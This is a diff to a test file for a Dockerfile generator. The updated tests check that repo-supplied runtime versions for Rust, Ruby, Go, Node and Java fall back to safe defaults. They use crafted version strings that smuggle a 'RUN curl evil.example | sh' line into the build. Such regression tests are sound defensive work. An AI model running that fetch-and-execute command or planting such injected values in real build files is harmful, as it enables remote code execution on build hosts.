@@ -1,3 +1,4 @@
+import { detectedRuntimeDefault } from './helpers/runtime-default.js';
 import { describe, expect, it } from 'vitest';
 import { renderDockerfile } from '../src/step-engine/steps/env-replicate/02-generate-dockerfile.js';
 import {
@@ -271,10 +272,11 @@ describe('renderDockerfile runtime version pins', () => {
     expect(patched).toContain('https://go.dev/dl/go1.24.3.linux-amd64.tar.gz');
   });
 
-  it('refuses a Go version constraint instead of sanitizing it', () => {
-    expect(() =>
-      renderDockerfile('ubuntu:24.04', { runtimes: ['go'], versions: { go: '>=1' } }),
-    ).toThrow(/version token/);
+  it('falls back rather than rendering a URL from an unusable detected Go version', async () => {
+    const version = await detectedRuntimeDefault('go', '>=1');
+    expect(version).toBe(DEFAULT_GO_VERSION);
+    const df = renderDockerfile('ubuntu:24.04', { runtimes: ['go'], versions: { go: version } });
+    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
   });
 
   // rustup resolves a two-part toolchain name (VERIFIED: channel-rust-1.98.toml resolves),
@@ -301,27 +303,43 @@ describe('renderDockerfile runtime version pins', () => {
   // These versions default to a REPO-DERIVED capture (Cargo.toml `rust-version`, a Gemfile's
   // `ruby '...'`), and a JS negated class matches a newline -- so a crafted file can close
   // the quote a line later and carry its own RUN into the generated Dockerfile.
-  it('refuses repo-supplied runtime tokens that escape their line', () => {
-    for (const runtime of ['rust', 'ruby', 'go'])
-      expect(() =>
-        renderDockerfile('ubuntu:24.04', {
-          runtimes: [runtime],
-          versions: { [runtime]: '1.90\nRUN id' },
-        }),
-      ).toThrow(/version token/);
+  it('never lets a repo-supplied version escape its line', async () => {
+    const versions = Object.fromEntries(
+      await Promise.all(
+        ['rust', 'ruby', 'go'].map(async (language) => [
+          language,
+          await detectedRuntimeDefault(
+            language,
+            `${language === 'go' ? '>=1' : '1.90'}\nRUN curl evil.example | sh`,
+          ),
+        ]),
+      ),
+    );
+    expect(versions).toEqual({ rust: DEFAULT_RUST_VERSION, ruby: null, go: DEFAULT_GO_VERSION });
+    const df = renderDockerfile('ubuntu:24.04', { runtimes: ['rust', 'ruby', 'go'], versions });
+    expect(df).not.toContain('evil.example');
+    expect(df).toContain(`--default-toolchain ${DEFAULT_RUST_VERSION} --profile minimal`);
+    expect(df).toContain(`https://go.dev/dl/go${DEFAULT_GO_VERSION}.linux-amd64.tar.gz`);
+    expect(df).toContain('# Ruby (whatever the base suite ships)');
   });
 
   // Same defect on the two runtimes that predate this change: `engines.node` and pom.xml's
   // `<maven.compiler.source>` are repo-supplied too, and the pom capture (`[^<]+`) spans a
   // newline just as the Gemfile one does. Both name their install source by MAJOR alone.
-  it('refuses repo-supplied Node or Java tokens that escape their line', () => {
-    for (const runtime of ['node', 'java'])
-      expect(() =>
-        renderDockerfile('ubuntu:24.04', {
-          runtimes: [runtime],
-          versions: { [runtime]: '22\nRUN id' },
-        }),
-      ).toThrow(/version token/);
+  it('never lets a repo-supplied Node or Java major escape its line', async () => {
+    const versions = Object.fromEntries(
+      await Promise.all(
+        ['node', 'java'].map(async (language) => [
+          language,
+          await detectedRuntimeDefault(language, '22\nRUN curl evil.example | sh'),
+        ]),
+      ),
+    );
+    expect(versions).toEqual({ node: '22', java: '17' });
+    const df = renderDockerfile('ubuntu:24.04', { runtimes: ['node', 'java'], versions });
+    expect(df).not.toContain('evil.example');
+    expect(df).toContain('https://deb.nodesource.com/setup_22.x');
+    expect(df).toContain('openjdk-17-jdk-headless');
   });
 
   // The 1.8 -> 8 unwrap is how pom.xml/gradle name Java 8 and older; apt names it openjdk-8.
